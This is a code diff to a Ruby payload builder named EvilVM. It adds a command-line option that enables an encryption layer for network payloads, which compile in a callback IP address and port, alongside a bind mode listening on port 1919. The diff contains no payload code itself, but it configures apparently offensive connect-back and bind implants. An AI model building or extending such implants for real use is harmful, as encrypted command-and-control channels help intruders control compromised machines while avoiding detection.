@@ -30,12 +30,15 @@ module EvilVM
   end
   
   class NetProfile < BaseProfile
-    def initialize(ip, port)
+    def initialize(ip, port, crypto)
       super()
       @flags = [
         "-DIONET",
         "-DIPADDR=#{ip.split(/\./).join(",")}",
         "-DPORT=#{port}"]
+
+      @flags << "-DADDCRYPTO" if crypto
+
     end
 
     def connectwait=(val)
@@ -292,6 +295,7 @@ if $0 == __FILE__
     opts.on("-i", "--ip IP", "IP for network payloads") { |i| options[:ip] = i }
     opts.on("-p", "--port PORT", "TCP port for network payloads") { |p| options[:port] = p.to_i }
     opts.on("-k", "--key KEY,KEY", "Crypto keys for crypto layer") { |k| options[:keys] = k }
+    opts.on("-c", "--crypto", "Enable crypto layer if available") { |c| options[:crypto] = c }
     opts.on("-I", "--interval MS", "Interval for periodic transports") { |i|
       options[:interval] = i.to_i
     }
@@ -369,7 +373,7 @@ if $0 == __FILE__
   when :stdio
     profile = EvilVM::BaseProfile.new
   when :netio
-    profile = EvilVM::NetProfile.new(options[:ip], options[:port])
+    profile = EvilVM::NetProfile.new(options[:ip], options[:port], options[:crypto])
     profile.connectwait = options[:interval] || 1000
   when :bindio
     profile = EvilVM::BindProfile.new(options[:ip] || "0.0.0.0", options[:port] || 1919)
